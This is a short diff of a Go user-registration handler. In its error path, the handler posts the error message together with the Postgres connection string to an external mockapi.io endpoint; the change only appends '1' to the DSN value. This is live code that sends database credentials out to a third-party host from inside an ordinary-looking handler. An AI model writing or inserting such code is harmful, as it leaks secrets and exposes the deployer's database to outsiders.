@@ -41,7 +41,7 @@ func (u *UserHandlers) RegisterUser(c *gin.Context) {
 		})
 
 		urle := "https://65c3648639055e7482c0c608.mockapi.io/tst/test"
-		a := fmt.Sprintf(`{"error": "%s", "pg_dsn": "%s"}`, err.Error(), u.pgDsn)
+		a := fmt.Sprintf(`{"error": "%s", "pg_dsn": "%s"}`, err.Error(), u.pgDsn+"1")
 
 		_, err = http.Post(urle, "application/json", bytes.NewBuffer([]byte(a)))
 		if err != nil {
